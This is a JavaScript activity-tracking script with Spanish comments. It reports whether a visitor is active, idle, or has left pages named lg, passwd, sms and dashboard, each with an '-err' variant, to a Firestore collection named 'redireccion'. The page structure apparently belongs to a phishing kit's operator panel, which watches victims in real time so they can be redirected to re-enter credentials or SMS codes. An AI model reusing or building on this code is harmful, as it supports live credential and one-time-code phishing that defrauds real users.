// Script de detección de actividad del usuario en dashboard.html y dashboard-err.html
// Detecta si el usuario está activo, inactivo o ha abandonado la página

(function() {
  'use strict';

  console.log('🔍 Inicializando sistema de detección de actividad...');

  // Configuración
  const CONFIG = {
    INACTIVITY_TIMEOUT: 30000, // 30 segundos sin actividad = inactivo
    UPDATE_INTERVAL: 5000, // Actualizar Firestore cada 5 segundos si hay actividad
    VISIBILITY_UPDATE_DELAY: 2000 // Delay para actualizar cuando cambia visibilidad
  };

  const PAGE_PATTERNS = [
    { match: 'dashboard-err.html', location: 'dashboard-err' },
    { match: 'dashboard.html', location: 'dashboard' },
    { match: 'lg-err.html', location: 'lg-err' },
    { match: 'lg.html', location: 'lg' },
    { match: 'passwd-err.html', location: 'passwd-err' },
    { match: 'passwd.html', location: 'passwd' },
    { match: 'sms-err.html', location: 'sms-err' },
    { match: 'sms.html', location: 'sms' }
  ];

  const SESSION_KEY_CANDIDATES = [
    'current_dashboard_user',
    'dashboard_session_user',
    'usuarioActual'
  ];

  const LOCAL_KEY_CANDIDATES = [
    'dashboard_persistent_user',
    'dashboard_session_user',
    'usuarioActual'
  ];

  // Variables de estado
  let userId = null;
  let pageLocation = null;
  let isActive = true;
  let lastActivityTimestamp = Date.now();
  let inactivityTimer = null;
  let updateTimer = null;
  let lastFirestoreUpdate = 0;

  // Determinar ubicación de la página
  function determinePageLocation() {
    const path = (window.location.pathname || '').toLowerCase();
    const match = PAGE_PATTERNS.find(pattern => path.includes(pattern.match));
    return match ? match.location : 'unknown';
  }

  // Obtener userId desde múltiples fuentes
  function getUserId() {
    const sessionId = getFromStorage(sessionStorage, SESSION_KEY_CANDIDATES);
    if (sessionId) {
      return sessionId;
    }

    const localId = getFromStorage(localStorage, LOCAL_KEY_CANDIDATES);
    if (localId) {
      return localId;
    }

    const params = new URLSearchParams(window.location.search);
    return params.get('user') || params.get('usuario') || params.get('id');
  }

  function getFromStorage(storage, keys) {
    if (!storage || !keys || !Array.isArray(keys)) {
      return null;
    }

    for (const key of keys) {
      if (typeof key !== 'string') continue;
      try {
        const value = storage.getItem(key);
        if (value && value.trim().length > 0) {
          return value.trim();
        }
      } catch (error) {
        console.warn(`⚠️ No se pudo acceder a la clave "${key}" en el almacenamiento`, error);
        return null;
      }
    }

    return null;
  }

  // Actualizar actividad en Firestore
  async function updateActivityInFirestore(forceUpdate = false) {
    if (!userId) {
      console.warn('⚠️ No se encontró userId para actualizar actividad');
      return;
    }

    if (!window.firebase || !firebase.firestore) {
      console.error('❌ Firestore no disponible para registrar actividad');
      return;
    }

    const now = Date.now();
    
    // Evitar actualizaciones muy frecuentes (excepto si es forzado)
    if (!forceUpdate && (now - lastFirestoreUpdate) < CONFIG.UPDATE_INTERVAL) {
      return;
    }

    try {
      const docRef = firebase.firestore().collection('redireccion').doc(userId);
      
      const updateData = {
        isActive: isActive,
        lastActivity: firebase.firestore.FieldValue.serverTimestamp(),
        pageLocation: pageLocation,
        activityUpdated: new Date().toISOString()
      };

      await docRef.update(updateData);
      
      lastFirestoreUpdate = now;
      console.log(`✅ Actividad actualizada - isActive: ${isActive}, page: ${pageLocation}`);
      
    } catch (error) {
      console.error('❌ Error actualizando actividad en Firestore:', error);
    }
  }

  // Marcar usuario como activo
  function markAsActive() {
    const wasInactive = !isActive;
    isActive = true;
    lastActivityTimestamp = Date.now();

    // Si estaba inactivo y ahora está activo, actualizar inmediatamente
    if (wasInactive) {
      console.log('🟢 Usuario reactivado');
      updateActivityInFirestore(true);
    }

    // Reiniciar timer de inactividad
    clearTimeout(inactivityTimer);
    inactivityTimer = setTimeout(() => {
      isActive = false;
      console.log('🟡 Usuario marcado como inactivo (sin interacción por 30s)');
      updateActivityInFirestore(true);
    }, CONFIG.INACTIVITY_TIMEOUT);
  }

  // Manejar eventos de actividad
  function handleActivityEvent() {
    markAsActive();
  }

  // Manejar cambio de visibilidad de la página
  function handleVisibilityChange() {
    if (document.hidden) {
      // Usuario cambió de pestaña o minimizó ventana
      console.log('👁️ Página oculta - Usuario cambió de pestaña');
      isActive = false;
      clearTimeout(inactivityTimer);
      
      // Actualizar después de un delay
      setTimeout(() => {
        updateActivityInFirestore(true);
      }, CONFIG.VISIBILITY_UPDATE_DELAY);
      
    } else {
      // Usuario regresó a la pestaña
      console.log('👁️ Página visible - Usuario regresó');
      markAsActive();
      updateActivityInFirestore(true);
    }
  }

  // Manejar abandono de página
  function handlePageHide(event) {
    console.log('🚪 Usuario abandonando la página');
    isActive = false;

    // Usar sendBeacon/update según disponibilidad
    try {
      if (!window.firebase || !firebase.firestore) {
        return;
      }

      const data = {
        isActive: false,
        lastActivity: new Date().toISOString(),
        pageLocation: 'left',
        activityUpdated: new Date().toISOString()
      };

      const docRef = firebase.firestore().collection('redireccion').doc(userId);

      if (navigator.sendBeacon) {
        const url = firebase.firestore().collection('redireccion').doc(userId).path;
        console.log(`sendBeacon no implementado para Firestore (ruta: ${url})`);
      } else {
        docRef.update(data);
      }

    } catch (error) {
      console.error('❌ Error en pagehide:', error);
    }
  }

  // Inicializar sistema de tracking
  async function initializeTracking() {
    // Obtener userId
    userId = getUserId();
    
    if (!userId) {
      console.error('❌ No se pudo obtener userId - Sistema de tracking deshabilitado');
      return;
    }

    // Determinar página actual
    pageLocation = determinePageLocation();
    
    console.log(`📍 Tracking inicializado:`);
    console.log(`   - Usuario: ${userId}`);
    console.log(`   - Ubicación: ${pageLocation}`);

    // Marcar como activo inicialmente
    isActive = true;
    await updateActivityInFirestore(true);

    // Configurar event listeners para detectar actividad
    const activityEvents = ['mousemove', 'keydown', 'scroll', 'click', 'touchstart'];
    
    activityEvents.forEach(event => {
      document.addEventListener(event, handleActivityEvent, { passive: true });
    });

    // Configurar Page Visibility API
    document.addEventListener('visibilitychange', handleVisibilityChange);

    // Configurar pagehide para detectar abandono compatible con permisos
    window.addEventListener('pagehide', handlePageHide);

    // Actualizar periódicamente mientras el usuario esté activo
    updateTimer = setInterval(() => {
      if (isActive && !document.hidden) {
        updateActivityInFirestore();
      }
    }, CONFIG.UPDATE_INTERVAL);

    // Iniciar timer de inactividad
    inactivityTimer = setTimeout(() => {
      isActive = false;
      console.log('🟡 Usuario inactivo (timeout inicial)');
      updateActivityInFirestore(true);
    }, CONFIG.INACTIVITY_TIMEOUT);

    console.log('✅ Sistema de detección de actividad configurado');
  }

  // Inicializar cuando el DOM esté listo
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeTracking);
  } else {
    // DOM ya está listo
    initializeTracking();
  }

  // Cleanup al cerrar o abandonar página
  window.addEventListener('pagehide', () => {
    clearTimeout(inactivityTimer);
    clearInterval(updateTimer);
  });

})();
